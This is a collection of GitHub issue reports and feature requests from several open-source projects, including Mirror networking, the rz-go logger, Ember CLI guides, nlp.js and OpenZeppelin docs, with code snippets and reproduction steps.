This sample project is being built for testing the creation of multiple Player objects for a single Client so that it supports local multiplayer on a single Client and multiple players on a single Client for online play.

An empty NetworkBehavior object is used for the Player prefab that is auto spawned by the NetworkManager to immediately put the Client into a ready state. Afterwards, the Server will manually spawn 1 or more "Player" objects and assign authority to the Client that registered itself with the Server.

Using the current Asset Store build of Mirror, this works fine with no issue. Upgrading to the latest from GitHub v6.5.3 no "Player" objects are spawned and no error is displayed....

**Repro project**
https://drive.google.com/file/d/1s1QID09KZQKeohc8Reh338TAkv8tM4Pb/view?usp=sharing

**To Reproduce**
Steps to reproduce the behavior:
1. Open the attached project '...'
2. Open the Main scene
3. Press Play in the Editor
4. Manually spawned Player Objects do not successfully spawn, no error is displayed

**Expected behavior**
1 or more Player Object(s) should spawn after Hosting or joining as a Client

**Screenshots**
If applicable, add screenshots to help explain your problem.

**Desktop (please complete the following information):**
* OS:Windows
* Build target: Standalone
* Unity version: 2019.2.14f1
* Mirror branch: master
 Component Classes Missing From API Docs **Describe the bug**
Example: when adding a SyncVar to any component inheriting from NetworkBehaviour NetworkSyncMode should be revealed in the inspector. If the object is already selected the property will not be seen until the object is de-selected, and then re-selected. The same is true for when removing SyncVar. This bug was only tested with SyncVar.

**To Reproduce**
1. Create a new script which inherits from NetworkBehaviour.
2. Add script to an empty gameobject in the scene.
3. Add a SyncVar to script, save, go back to Unity.
4. Note properties don't update until reselecting gameobject.

**Expected behavior**
NetworkSyncMode should be shown or removed when including or excluding SyncVar from a script.

**Screenshots**
If applicable, add screenshots to help explain your problem.

**Desktop (please complete the following information):**
* Unity version: 2018.4.12f1
* Mirror branch:  5.0.2
 Section 4 of the [Migration Guide](https://mirror-networking.com/docs/General/Migration.html#4-replace-playercontroller-with-identity) has some broken code formatting. Would be nice to have a threshold control on Network Transform to have better control over limiting unnecessary network traffic for movement updates.  ## :rotating_light: The automated release from the `master` branch failed. :rotating_light:

I recommend you give this issue a high priority, so other packages depending on you could benefit from your bug fixes and new features.

You can find below the list of errors reported by **semantic-release**. Each one of them has to be resolved in order to automatically publish your package. I’m sure you can resolve this 💪.

Errors are usually caused by a misconfiguration or an authentication problem. With each error reported below you will find explanation and guidance to help you to resolve it.

Once all the errors are resolved, **semantic-release** will release your package the next time you push a commit to the `master` branch. You can also manually restart the failed CI job that runs **semantic-release**.

If you are not sure how to resolve this, here is some links that can help you:
- [Usage documentation](https://github.com/semantic-release/semantic-release/blob/caribou/docs/usage/README.md)
- [Frequently Asked Questions](https://github.com/semantic-release/semantic-release/blob/caribou/docs/support/FAQ.md)
- [Support channels](https://github.com/semantic-release/semantic-release#get-help)

If those don’t help, or if this issue is reporting something you think isn’t right, you can always ask the humans behind **[semantic-release](https://github.com/semantic-release/semantic-release/issues/new)**.

---

### Missing `package.json` file.

A [package.json file](https://docs.npmjs.com/files/package.json) at the root of your project is required to release on npm.

Please follow the [npm guideline](https://docs.npmjs.com/getting-started/creating-node-modules) to create a valid `package.json` file.

---

Good luck with your project ✨

Your **[semantic-release](https://github.com/semantic-release/semantic-release)** bot :package::rocket:

<!-- semantic-release:github -->
<---------->
141762614
Sorry, this is the only way i can say my problem with your pretty example.

> pub dbs: Addr<Syn, util::database::Database>,
>    |                        ^^^^^^^^^^^^^^^^^^^^^^^^ unexpected type argument https://github.com/ryanmcgrath/jelly/blob/master/src/util/forms.rs

> no method named `inner` found for type `validator::ValidationErrors` in the current scope
 https://github.com/ryanmcgrath/jelly/blob/master/src/util/forms.rs

> no method named `inner` found for type `validator::ValidationErrors` in the current scope
 Sorry, this is the only way i can say my problem with your pretty example.

> pub dbs: Addr<Syn, util::database::Database>,
>    |                        ^^^^^^^^^^^^^^^^^^^^^^^^ unexpected type argument
<---------->
142140968
Is it possible to append context fields rather than replace them as `With` does? I'm struggling to find a way.

My use case is preserving the context of the "root" logger when creating a sublogger, but adding additional context to be carried forward.

Kudos on a great library! I appreciate the thought put into the interface. If I use a file like this:

~~~go
package main
import (
	"github.com/bloom42/rz-go/v2/log"
)
func main() {
	log.Info("aaaaa bbbbb")
}
~~~

it is black and white. Is it possible to return color? Is it possible to append context fields rather than replace them as `With` does? I'm struggling to find a way.

My use case is preserving the context of the "root" logger when creating a sublogger, but adding additional context to be carried forward.

Kudos on a great library! I appreciate the thought put into the interface. `Your bench are biased BTW, you pre-compute your fields`.
See those of https://github.com/rs/zerolog for more details Multiple lines of log with FormatterCLI are all on one line.

```
tv@dark ~/z$ cat go.mod
module m

go 1.12

require github.com/bloom42/rz-go/v2 v2.6.0
tv@dark ~/z$ cat simple.go
package main

import (
	"github.com/bloom42/rz-go/v2"
)

func main() {
	l := rz.New(
		rz.Formatter(rz.FormatterCLI()),
	)
	l.Info("info from logger", rz.String("hello", "world"), rz.Caller(true))
}
tv@dark ~/z$ go run simple.go
✔ info from logger caller=/home/tv/z/simple.go:11 hello=worldtv@dark ~/z$
tv@dark ~/z$
tv@dark ~/z$
tv@dark ~/z$
tv@dark ~/z$ go run simple.go |od -a
0000000 esc   [   3   6   m   b  fs dc4  sp esc   [   0   m   i   n   f
0000020   o  sp   f   r   o   m  sp   l   o   g   g   e   r  sp esc   [
0000040   3   6   m   c   a   l   l   e   r esc   [   0   m   =   /   h
0000060   o   m   e   /   t   v   /   z   /   s   i   m   p   l   e   .
0000100   g   o   :   1   1  sp esc   [   3   6   m   h   e   l   l   o
0000120 esc   [   0   m   =   w   o   r   l   d
0000132
tv@dark ~/z$
``` Your go.mod says github.com/bloom42/rz-go but github redirects that to https://github.com/z0mbie42/rz-go. Is the whole thing migrating over, should these import paths change, or what? This is quite confusing. It would be lovely if we could have an example showing how to use a `rz.Dict`. I've been playing with this for probably an hour and no joy. Also reviewed https://github.com/rs/zerolog examples hoping you maintained the same general syntax. No joy. Based on what I was reading in the code I tried:

```go
event := &rz.Event{}
event.Append(rz.Int("code", resp.StatusCode()))
event.Append(rz.String("line", resp.Status()))
log.Info("Page response", rz.Dict("status", event), rz.String("func", "pageLoginPostSend"))
```

That gives me no errors but also leaves nothing in the log. I'd love to use `rz.Dict` but there needs to be a working example. It would be lovely if we could have an example showing how to use a `rz.Dict`. I've been playing with this for probably an hour and no joy. Also reviewed https://github.com/rs/zerolog examples hoping you maintained the same general syntax. No joy. Based on what I was reading in the code I tried:

```go
event := &rz.Event{}
event.Append(rz.Int("code", resp.StatusCode()))
event.Append(rz.String("line", resp.Status()))
log.Info("Page response", rz.Dict("status", event), rz.String("func", "pageLoginPostSend"))
```

That gives me no errors but also leaves nothing in the log. I'd love to use `rz.Dict` but there needs to be a working example. Please put a note in the README that states this project has moved to <https://gitlab.com/z0mbie42/rz-go>. Also, **STOP MOVING THE PROJECT AROUND WITHOUT NOTIFICATION**! First it was at <https://github.com/bloom42/rz-go>, then suddenly appeared at <https://github.com/z0mbie42/rz-go>, and (hopefully) finally moved to <https://gitlab.com/z0mbie42/rz-go>. Something I was only able to find by read thing through closed issues at <https://github.com/z0mbie42/rz-go>. At the very least do _not_ close this issue so that others might have some hope of finding where the project has moved if the don't see the update on the README. As a human, I am not a JSON parser, I match visual patterns. When my source code says

```
	logger.Info("serving",
		rz.String("path", path),
		rz.String("url", fmt.Sprintf("http://%s/", l.Addr())),
	)
```

I expect the log to have "serving", "path" and "url", in that order, with probably some common fields up front. For that call, rz outputs

```
{"level":"info","path":".","url":"http://[::]:8000/","timestamp":"2019-06-24T22:48:47Z","message":"serving"}
```

I expected timestamp, (maybe level, I don't care about levels much personally I'd much rather do hierarchies), message, path, url.
 Color

If I use a file like this:

~~~go
package main
import "github.com/bloom42/rz-go/v2/log"
func main() {
   log.Info("aaaaa bbbbb")
}
~~~

it is black and white. Is it possible to return color?
 Using this file:

~~~go
package main
import (
   "github.com/bloom42/rz-go/v2"
   "github.com/bloom42/rz-go/v2/log"
)
func main() {
   q := log.With(rz.Formatter(rz.FormatterConsole()))
   q.Info("aaaaa bbbbb")
}
~~~

I get this result:

~~~
2019-05-16T23:56:27Z | [36mINFO [0m| aaaaa bbbbb
~~~

Note that other projects work as expected:

~~~go
package main
import "github.com/labstack/gommon/log"
func main() {
   log.EnableColor()
   log.Info("aaaaa bbbbb")
}
~~~ I would like to have custom encoders for objects of my own.  Is that possible? You've known about this for at least 4 months: https://www.reddit.com/r/golang/comments/ao3m4j/ripzap_the_fastest_structured_leveled_json_logger/efyzfou/

This repo still shows no signs of containing @rs's copyright.

The code is *clearly* copied:

https://github.com/rs/zerolog/blob/e0f8de6c359435b241b622af8e9a2e6d5a5e012c/array.go  
https://github.com/z0mbie42/rz-go/blob/fdcaa7c230b49d2d72fd87fb3e2d41f822a3db49/array.go

All you need to do is include https://github.com/rs/zerolog/blob/master/LICENSE in your repo. Do the right thing.
 It would be great if we could configure `rz` log levels beyond field names.

Stackdriver, for example, supports 9 levels of severity: https://cloud.google.com/logging/docs/reference/v2/rest/v2/LogEntry#logseverity I really like the interface change in `v2` to just pass `Field`s to the log call, but, unless I'm missing something, I think we lost the ability to easily avoid expensive computations if the line would never be printed due to the set log level being higher.

E.g. before I could do something like:

```
logger.Debug("some message", func(e *rz.Event) {
    foo := someExpensiveOperation()
    e.String("foo", foo)
}
```

Where (I assumed) that the function was never called if the log level was currently, e.g., Info, to avoid calculating a value that would never be used.

Is there a recommended pattern for dealing with this with the new API?

If not, one idea I had (that would require an API change) would be to allow for something like:

```
logger.Debug("some message", rz.Func(func() rz.Field) {
    foo := someExpensiveOperation()
    return rz.String("foo", foo)
})
```

Where `rz-go` would only call this function to resolve the field if the log line would actually be printed.

Thanks again for all your work! You've known about this for at least 4 months: https://www.reddit.com/r/golang/comments/ao3m4j/ripzap_the_fastest_structured_leveled_json_logger/efyzfou/

This repo still shows no signs of containing @rs's copyright.

The code is *clearly* copied:

https://github.com/rs/zerolog/blob/e0f8de6c359435b241b622af8e9a2e6d5a5e012c/array.go  
https://github.com/z0mbie42/rz-go/blob/fdcaa7c230b49d2d72fd87fb3e2d41f822a3db49/array.go

All you need to do is include https://github.com/rs/zerolog/blob/master/LICENSE in your repo. Do the right thing.
 `Your bench are biased BTW, you pre-compute your fields`.
See those of https://github.com/rs/zerolog for more details This appears to be an is [an issue with `golang/dep`'s inability to handle import pathing that encodes the version](https://github.com/golang/dep/issues/1961) as you have here (`github.com/bloom42/rz-go/v2`) starting with `v2.4.0`.

The exact error it returns is `v2.4.2: "github.com/bloom42/rz-go" imports "github.com/bloom42/rz-go/v2/internal/json", which contains malformed code: no package exists at "github.com/bloom42/rz-go/v2/internal/json"`.

I realize that this isn't an issue with `rz-go`, but given that modules are still experimental and not yet widely adopted I was wondering if you'd be willing to maintain a `v2` branch that has the import paths not using the `/v2` suffix. I'm happy to open a PR for this if acceptable.

Thanks again for your work! Multiple lines of log with FormatterCLI are all on one line.

```
tv@dark ~/z$ cat go.mod
module m

go 1.12

require github.com/bloom42/rz-go/v2 v2.6.0
tv@dark ~/z$ cat simple.go
package main

import (
	"github.com/bloom42/rz-go/v2"
)

func main() {
	l := rz.New(
		rz.Formatter(rz.FormatterCLI()),
	)
	l.Info("info from logger", rz.String("hello", "world"), rz.Caller(true))
}
tv@dark ~/z$ go run simple.go
✔ info from logger caller=/home/tv/z/simple.go:11 hello=worldtv@dark ~/z$
tv@dark ~/z$
tv@dark ~/z$
tv@dark ~/z$
tv@dark ~/z$ go run simple.go |od -a
0000000 esc   [   3   6   m   b  fs dc4  sp esc   [   0   m   i   n   f
0000020   o  sp   f   r   o   m  sp   l   o   g   g   e   r  sp esc   [
0000040   3   6   m   c   a   l   l   e   r esc   [   0   m   =   /   h
0000060   o   m   e   /   t   v   /   z   /   s   i   m   p   l   e   .
0000100   g   o   :   1   1  sp esc   [   3   6   m   h   e   l   l   o
0000120 esc   [   0   m   =   w   o   r   l   d
0000132
tv@dark ~/z$
```
<---------->
142605200
Something like:

```js
// index.js
module.exports = {
  name: require('./package').name, 

  includedCommands() {
    return {
      'my-special-command': {
        name: 'my-special-command',
        works: 'insideProject',
        description: 'whatever description here',
        availableOptions: [],

        run() { /* do the stuff */ }
      },
    }
  }
};
``` https://github.com/ember-decorators/ember-decorators/issues/134#issuecomment-317098014

> Ember-CLI considers `dependencies` in an addon to actually be addon dependencies, and `devDependencies` to be the Dummy app's dependencies.

This case looks to be the same than having to set `ember-cli-htmlbars` in the `dependencies` for component addons.

It may be good to document this detail when talking about the `Dummy` app. I recently got a question in the Ember Community Discord: 

> can someone explain to me what the difference between index.js and ember-cli-build.js in an addon is?

And here was my answer:

> the index.js is the "entry point" for your addon and is where you add hooks if you're doing something intermediate or advanced with your addon. the ember-cli-build.js inside your addon is only used to build the dummy app when developing it locally and has no influence on what happens to the consuming app

It seems to me that as we have been training people that the `ember-cli-build.js` is the "entry point" to an Ember App it is likely that we will confuse people when they look at an addon. I assume we might be able to add a note to https://cli.emberjs.com/release/writing-addons/#addonfilestructure or somewhere that is explicit about the difference?  We have infrastructure to show the path of the file the sample corresponds to, as well as the type of file. For example:

    ```handlebars {data-filename=app/templates/application.hbs}
    <h2>Welcome to Ember</h2>
    ``` https://github.com/ember-decorators/ember-decorators/issues/134#issuecomment-317098014

> Ember-CLI considers `dependencies` in an addon to actually be addon dependencies, and `devDependencies` to be the Dummy app's dependencies.

This case looks to be the same than having to set `ember-cli-htmlbars` in the `dependencies` for component addons.

It may be good to document this detail when talking about the `Dummy` app. I recently got a question in the Ember Community Discord: 

> can someone explain to me what the difference between index.js and ember-cli-build.js in an addon is?

And here was my answer:

> the index.js is the "entry point" for your addon and is where you add hooks if you're doing something intermediate or advanced with your addon. the ember-cli-build.js inside your addon is only used to build the dummy app when developing it locally and has no influence on what happens to the consuming app

It seems to me that as we have been training people that the `ember-cli-build.js` is the "entry point" to an Ember App it is likely that we will confuse people when they look at an addon. I assume we might be able to add a note to https://cli.emberjs.com/release/writing-addons/#addonfilestructure or somewhere that is explicit about the difference?  - [x] blog post drafted https://github.com/emberjs/website/pull/3703
    - [ ] blog post published 
- [x] PR opened to add CLI Guides to the navbar defaults of ember-styleguide https://github.com/ember-learn/ember-styleguide/pull/115
    - [x] merged
- [ ] After a merge & release of ember-styleguide, PRs to update the ember-styleguide versions used by:
    - [ ] The Guides
    - [ ] The deprecation app
    - [ ] The builds app
    - [x] ~Statusboard?~ it doesn't use styleguide yet
- [x] PR opened to add the link to the navbar for the API docs (not yet using ember-styleguide) https://github.com/ember-learn/ember-api-docs/pull/576
    - [x] merged 
- [x] PR opened to add the link to the navbar for the website repo (not yet using ember-styleguide) https://github.com/emberjs/website/pull/3705
    - [x] merged
- [x] PR opened for a banner to the ember-cli.com site https://github.com/ember-cli/ember-cli.github.io/pull/220
    - [x] merged
- [ ] Change links within the Ember.js Guides themselves It is confusing that `index.html` is missing from the explanations. ## backstory 
We use `ember server --secure-proxy false --proxy https://127.0.0.1:4000` for local development. We proxy to a node.js application as our API server at port 4000. A few of our endpoints stream a downloaded file to the browser. When I switched to using `ember serve`, over a custom configured `apache`, these endpoint downloads failed locally. 
## main problem
I searched for about 6h on the "right" way to do this in my ember project. This surprised me as basic configuration in ember should be seamless. Additionally, I did not expect to have to override the default `ember server` behavior by defining a proxy using  `ember g http-proxy my-download-path http:127.0.0.1:4000`. If this tripped me up, I think it could scare other users away.  I think we need to capture how to do this and/or examples of using http proxies with ember-cli
## solutions

* Should this be a topic in the advanced use?
* More general recipe somewhere else? We have infrastructure to show the path of the file the sample corresponds to, as well as the type of file. For example:

    ```handlebars {data-filename=app/templates/application.hbs}
    <h2>Welcome to Ember</h2>
    ``` In ember-cli (for a very very long time) it has been possible to have ember-cli use a different main entry point for the addon than what a normal `require('my-package-name')` would return.

The way to do this is to add an `"ember-addon": { "main": "some-other-file.js" }` to your `package.json`. Normal `require` invocation will look at the `main` entry point, and `ember-cli` will look at `some-other-file.js`.

One nice benefit of this is that if you make `main` be `addon/index.js` and `ember-addon.main` be `index.js`, "normal" node_module resolution rules apply for things in `addon/index.js`. This means that things like `eslint-plugin-import` and `TypeScript` can actual see and validate an import from the addon name (though not with nested paths). 

For example, typescript (and eslint-plugin-import) would see that this is valid:

```js
import Component from 'sparkles-component';

export default class extends Component {}
```

See https://github.com/rwjblue/sparkles-component/pull/23 as an example. In several places throughtout these guides, we show the file paths for components as `components/my-component.js` and `templates/components/my-component.hbs`. These references need to be updated to reflect the new structure where both hbs and js files are in `components`. Since the cli guides are not versioned, we should show both classic and octane layouts.

Here's the main page to update: https://cli.emberjs.com/release/advanced-use/project-layouts/

This work should target `master` and will be merged with 3.14. In the CLI guides, we have a section on generating components, https://cli.emberjs.com/release/basic-use/cli-commands/

In Octane, `ember g component` gets you just the test and template. Flags are needed to generate a glimmer-based or classic component, and we should cover them in this guide. The CLI guides are not versioned, so we need to make sure that we explain both Octane and non-Octane behavior.

This work should target master and will be merged in at 3.14 release. In https://github.com/ember-learn/cli-guides/pull/107, there was discussion about making the name consistent across websites, but we need to take a methodical approach to be successful.

This issue is to remind us that we haven't done that work yet, and we should.

The next steps are to write up a doc describing what should change, why, where, and when, as well as showing how the name will look in various scenarios. For example if a sentence starts with ember-cli, what does it look like? Etc. The previous ember-cli guide shows more information regarding the conventions of the addon structure.

- [previous](https://ember-cli.com/extending/#addon-project-structure)

- [latest](https://cli.emberjs.com/release/writing-addons/#addonfilestructure)

When looking at ember-cli/ember-cli#8342, I wanted to know how `test-support` and `addon-test-support` works, but this info is not available in the new ember-cli guide.

I think the missing info should be added in the new guides as well. I can create a PR if someone suggests how it could fit best in the new guide structure. 

Some suggestions to start the discussion: 

- add the missing items into the `Addon file structure` section.

- create  an `Extended addon file structure` section.


cc @jenweber 


 @cah-danmonroe has volunteered to help do this!

Part of work for https://github.com/ember-learn/guides-source/issues/139 https://cli.emberjs.com/release/appendix/common-issues/

Installing Canary Build docs reference bower install, which I think is outdated info? I'm not 100% sure how to do this yet, but this came up on a recent FastBoot team call (thanks @mansona!) and I think its a great idea.

Can we brainstorm just how best to do this? Now is no information in the page about what is send with analytics enabled.

We should add this info https://github.com/ember-cli/ember-cli/blob/master/docs/analytics.md in the Appendix section. We still talk about ajax in a few places.
<---------->
142908872
Hi !
I would like to know if the vietnamese language will soon be supported ? Hi !
I would like to know if the vietnamese language will soon be supported ? **Describe the bug**
I am getting 'None' intent but in classifications I can find some intents with more value than my threshold in classifications

**To Reproduce**
Steps to reproduce the behavior:
1. `const manager = new NlpManager({ languages: ['es'], defaultThreshold: 0.3, nlu: { useNoneFeature: false } });`
2. Run procces() after training

**Expected behavior**
Get some intent with higher value than threshold.
I think is about sort in classifications because I'm getting two first classification elements with value 0 so is triggering [this](https://github.com/axa-group/nlp.js/blob/23a8d1ba316ef2efdf219da90d93ee2c0cea7b29/lib/nlu/nlu-manager.js#L254). And the next three got values 0.48, 0.27 and 0.24

**Desktop (please complete the following information):**
 - OS: Linux
 - Browser: Node
 - Version: 10.15 **Describe the bug**
I am getting 'None' intent but in classifications I can find some intents with more value than my threshold in classifications

**To Reproduce**
Steps to reproduce the behavior:
1. `const manager = new NlpManager({ languages: ['es'], defaultThreshold: 0.3, nlu: { useNoneFeature: false } });`
2. Run procces() after training

**Expected behavior**
Get some intent with higher value than threshold.
I think is about sort in classifications because I'm getting two first classification elements with value 0 so is triggering [this](https://github.com/axa-group/nlp.js/blob/23a8d1ba316ef2efdf219da90d93ee2c0cea7b29/lib/nlu/nlu-manager.js#L257)

**Desktop (please complete the following information):**
 - OS: Linux
 - Browser: Node
 - Version: 10.15

**Additional context**
Add any other context about the problem here.
 **Describe the bug**
If several occurrences of the same entity are found in an utterance, the answer seems to use the one with the lowest position.

**To Reproduce**
```js
const { NlpManager, ConversationContext } = require('node-nlp');

async function main() {
  const manager = new NlpManager({ languages: ['en'] });
  const ctx = new ConversationContext();

  manager.addNamedEntityText('style', 'rock', ['en'], ['rock', 'Rock']);

  manager.slotManager.addSlot('music', 'style', true, {
    en: 'What style of music do you want?',
  });
  manager.addDocument('en', 'Play me some music', 'music');
  // This next line does not change anything but it's something I tried
  manager.addDocument('en', 'I want some %style%', 'music');
  manager.addAnswer('en', 'music', "Ok let's play some {{style}}");

  await manager.train();
  await manager.process('en', 'Play me some music', ctx);
  const result = await manager.process('en', 'I want some rock', ctx);
  console.log(JSON.stringify(result, null, 2));
}

main();
```

Here the log of the last process response. You can see one entity with a perfect accuracy smashed by the next one:
```json
{
  "utterance": "I want some rock",
  "locale": "en",
  "languageGuessed": false,
  "localeIso2": "en",
  "language": "English",
  "domain": "default",
  "classifications": [
    {
      "label": "music",
      "value": 1
    }
  ],
  "intent": "music",
  "score": 1,
  "entities": [
    {
      "start": 12,
      "end": 15,
      "len": 4,
      "levenshtein": 0,
      "accuracy": 1,
      "option": "rock",
      "sourceText": "rock",
      "entity": "style",
      "utteranceText": "rock"
    },
    {
      "entity": "style",
      "utteranceText": "I want some rock",
      "sourceText": "I want some rock",
      "accuracy": 0.95,
      "start": 0,
      "end": 15,
      "len": 16
    }
  ],
  "sourceEntities": [],
  "sentiment": {
    "score": 0.475,
    "comparative": 0.11875,
    "vote": "positive",
    "numWords": 4,
    "numHits": 4,
    "type": "senticon",
    "language": "en"
  },
  "actions": [],
  "srcAnswer": "Ok let's play some {{style}}",
  "answer": "Ok let's play some I want some rock"
}
```

**Expected behavior**
The entity used in answers should be the one with the higher accuracy value.

**Desktop (please complete the following information):**
 - OS: macOS 10.14.3
 - node: 10.15.1
 - axa-nlp: 3.10.1

**Additional context**
The problem seems to be here https://github.com/axa-group/nlp.js/blob/master/lib/nlp/nlp-manager.js#L451 and probably here too https://github.com/axa-group/nlp.js/blob/master/lib/nlp/nlp-manager.js#L433
 Could you please explain the difference between entities and sourceEntities in the response object? Could you please explain the difference between entities and sourceEntities in the response object? **Describe the bug**
some basic words can't be guessed correctly
**To Reproduce**
Steps to reproduce the behavior:
```js
const {Language} = require('node-nlp');

const language = new Language();
const guess = language.guess(
  'hello'
);
console.log(guess[0]);

```

**Expected behavior**

'hello' shouldn't be guessed as Sotho, but English. same for the French word "bonjour" is guessed as Lingala.

plus, I've already defined document for hello, but it's still guessed as Sotho. 

```js
manager.addDocument('en', 'hello', 'greetings.hello');
```

**the language guesser should first search in currently defined documents to increase precision.** 



 **Is your feature request related to a problem? Please describe.**
The bundle size is 2.3MB -- making it unsuitable for website deployment

**Describe the solution you'd like**
We need to find a way to shake the tree -- will webpack help?

**Describe alternatives you've considered**
Haven't tested yet, will webpack help?

**Additional context**
I am looking for guidance from @jesus-seijas-sp  who knows this package better, if there is room to trim things down. Maybe split off plugins or features not so common, like xlsx package, which would could reduce size substantially (does everyeone need escodegen, kuromoji.js, novel-segment?) **Is your feature request related to a problem? Please describe.**
The bundle size is 2.3MB -- making it unsuitable for website deployment

**Describe the solution you'd like**
We need to find a way to shake the tree (will webpack help) and remove uncommon packages

**Describe alternatives you've considered**
Haven't tested yet, will webpack help? Modularizing architecture to only keep most common features in core

**Additional context**
I am looking for guidance from @jesus-seijas-sp  who knows this package better, if there is room to trim things down. Maybe split off plugins or features not so common, like `xlsx` package, which would could reduce size substantially (does everyeone need `escodegen`,`kuromoji.js`, `novel-segment`?) **Describe the bug**
I noticed that 3.9.0 was released. Is there a way to know what changes went into it?

**To Reproduce**
N/A.

**Expected behavior**
A changelog or release notes section?

**Screenshots**
N/A.

**Desktop (please complete the following information):**
N/A.

**Additional context**
Currently I am reading through PRs to see what was merged. 
 **Describe the bug**
The line  `await manager.train();`  in the [docs](https://github.com/axa-group/nlp.js/blob/master/docs/example-of-use.md)
results in the following syntax error: `SyntaxError: await is only valid in async function`

 **Describe the bug**
The line  `await manager.train();`  in the [docs](https://github.com/axa-group/nlp.js/blob/master/docs/example-of-use.md)
results in the following syntax error: `SyntaxError: await is only valid in async function`

 This commit https://github.com/axa-group/nlp.js/commit/4af738314d11c64aaaf02d95d055a47c335ca219#diff-17f0d3c08759c7e20efe478795fc436bR92 reverts the train async. Blocking the event-loop, breaking servers and async apps.

Why was this done?  I have a task and I need knowledge about NER. in this library do you use the HMM algorithm to do NER? 
please help me, what is the algorithm for doing this NER? and please give me a reference for this study Hi there, and thank you for this great project!

**Describe the bug**
After a `load("./model.nlp")`, the result is not the same than after the training.

**To Reproduce**
Here is [the example](https://github.com/axa-group/nlp.js/blob/master/examples/console-bot) I used. I changed the `train-nlp.js` to add my own intents and utterances (the only changes I made).

- The first time I got this problem was with a big test: i trained 83 intents. It worked well just after the training. Then I restart the program - so I used the `load` function. Then the result was always the same: the first trained intent, and a "NaN" score.

- So I tried with less intents and it works better. But here is another problem I got:

```
**node .\index.js**
**Program:** Trained (hr): 249s 708.56ms for 56 intents
**Program:** Say something!
**Me:** how are you
**Program:** smalltalk.greetings.how_are_you 0.4852741995322251
**node .\index.js**
**Program:** Say something!
**Me:** are you ok
**Program:** smalltalk.agent.there 0.34087913613429177
**Me:** are you fine
**Program:** smalltalk.appraisal.good 0.41805671303445147
**Me:** how are you
**Program:** smalltalk.agent.there 0.2816300128888281
**Me:** how are you
**Program:** smalltalk.agent.there 0.2816300128888281
**node .\index.js**
**Program:** Say something!
**Me:** how are you
**Program:** smalltalk.agent.there 0.2816300128888281
```

Is there a solution to have the same results everywhere? My results were much better just after the training than after loading... Maybe I'm not using it correctly!

Thank you! :) does not work dependence npm cjk-conv  

/node_modules/cjk-conv/lib/zh/table/list.js
const __1 = require("../.."); //add

//__1.default..
.concat(arr.map(w(__1.default.cjk2zht))) // add __1.default.
        // @ts-ignore
        .concat(arr.map(w(__1.default.cn2tw))) //add __1.default.
        // @ts-ignore
        .concat(arr.map(w(__1.default.cjk2zhs))) // add __1.default.
        // @ts-ignore
        .concat(arr.map(w(__1.default.cjk2jp))) //add __1.default. **Describe the bug**
Context is not working, I try the example code.

https://imgur.com/a/zMV3gow

**Desktop (please complete the following information):**
 - OS: Windows 10
 - Version Node 8,12 -- nlp.js latest

 Compound words don't work optimally with NER in nlp.js. For example, according to nlp.js, Spiderman is a spider but not a man. Whitespace seems to have excessive significance. According to nlp.js, Spider-Man or Spider Man is certainly a spider and a man. I don't see the point in this separation. Especially in Finnish language this is a critical issue. We have hell of a lot compound words. It would be nice if nlp.js could be configured to behave differently in this case.

```
var {NerManager} = require('node-nlp');
manager = new NerManager({threshold:0.1});
manager.addNamedEntityText('species', 'spider', 'en', ['spider']);
manager.addNamedEntityText('species', 'man', 'en', ['man']);
manager.findEntities('spiderman', 'fi').then(entities => console.log(entities));
manager.findEntities('spider man', 'fi').then(entities => console.log(entities));
manager.findEntities('spider-man', 'fi').then(entities => console.log(entities));
```
spiderman returns

```
[ { start: 0,
    end: 8,
    len: 9,
    levenshtein: 3,
    accuracy: 0.5,
    option: 'spider',
    sourceText: 'spider',
    entity: 'species',
    utteranceText: 'spiderman' } ]
```

spider man and spider-man both return

```
[ { start: 0,
    end: 5,
    len: 6,
    levenshtein: 0,
    accuracy: 1,
    option: 'spider',
    sourceText: 'spider',
    entity: 'species',
    utteranceText: 'spider' },
  { start: 7,
    end: 9,
    len: 3,
    levenshtein: 0,
    accuracy: 1,
    option: 'man',
    sourceText: 'man',
    entity: 'species',
    utteranceText: 'man' } ]
``` **Describe the bug**
A clear and concise description of what the bug is.

**To Reproduce**
Steps to reproduce the behavior:
1. Go to '...'
2. Click on '....'
3. Scroll down to '....'
4. See error

**Expected behavior**
A clear and concise description of what you expected to happen.

**Screenshots**
If applicable, add screenshots to help explain your problem.

**Desktop (please complete the following information):**
 - OS: [e.g. iOS]
 - Browser [e.g. chrome, safari]
 - Version [e.g. 22]

**Additional context**
Add any other context about the problem here.

<---------->
143095406
Hi Matthias, I have owned the box sets for a while. Is there any chance I could get the video files that you have already encoded? There are three reasons:
1. My laptop doesn't have a DVD drive;
2. I don't have a computer that runs windows; and
3. I don't have the patience to encode so many discs! :-)
Abhaya
 Hi. Thank you for these instructions and the script. This is a huge help, saving me massive amounts of time.

I followed all the instructions, just as they are listed. However, the Looney Tune videos show up in Plex named as "Episode 1", "Episode 2", etc. Here is a screenshot:
![image](https://user-images.githubusercontent.com/24360823/51810568-a28ac700-2276-11e9-9593-939b395fc263.png)

That screenshot is from the first season, Season 1930, but the videos are named like this in all of the seasons.

Here is what the directory structure looks like (I'll use the 1930 season as an example, again):
K:\__Media for Plex\TV\Looney Tunes\1930

And here are the files in that directory:
Looney Tunes - S1930E02 - Congo Jazz.m4v
Looney Tunes - S1930E04 - The Booze Hangs High.m4v

Is there a setting I need to change in Plex to make the videos display the name of the episode instead of the episode number?

Also, I'm not sure if this is the correct place for me to ask my question. If I should ask this question somewhere else, please let me know.

Again, thank you for creating these extremely helpful instructions and script.
<---------->
143195936
Take https://github.com/OpenZeppelin/openzeppelin-solidity/blob/master/RELEASING.md as an example 
 Follow https://github.com/zeppelinos/zos/pull/463/files#r241450837 Currently the CLI tests are run in the `packages/cli` directory itself, and some of the tests read files from the filesystem in this directory. For example, some tests read the truffle config file, which we should have removed in #1294 but couldn't due to this.

We should make sure that tests run in their own environment, including a working directory dedicated specially to testing. We quickly tried running `process.chdir('test-cwd')` in the `setup.js` file but this didn't work. As part of a bigger review of the documentation (https://github.com/OpenZeppelin/docs.openzeppelin.com/issues/47), we're restructuring the content. The idea is to organize it in a conceptual hierarchy rather than divide it in "Basics" and "Advanced".

The SDK docs will be split into CLI and Upgrades. The structure should be as follows. Most of these articles already exist, except the ones in italics.

#### CLI

- Overview (incl: Your first project)
- _Compiling_
- _Create & Upgrade_ (incl: create2)
- Interacting with contracts
- Dependencies (i.e. “linking oz contracts”)
- _Verify_
- _Admins_ (set-admin)
- Ethereum Packages (incl: “contracts architecture”?)
- Using with Truffle
- API Reference
    - Commands
    - Config Files

#### Upgrades

- Overview
- Programmatic library
- Writing upgradeable contracts
- Proxies (aka “Upgrades pattern”)
- Testing upgradeable projects ? (may want to remove this one)
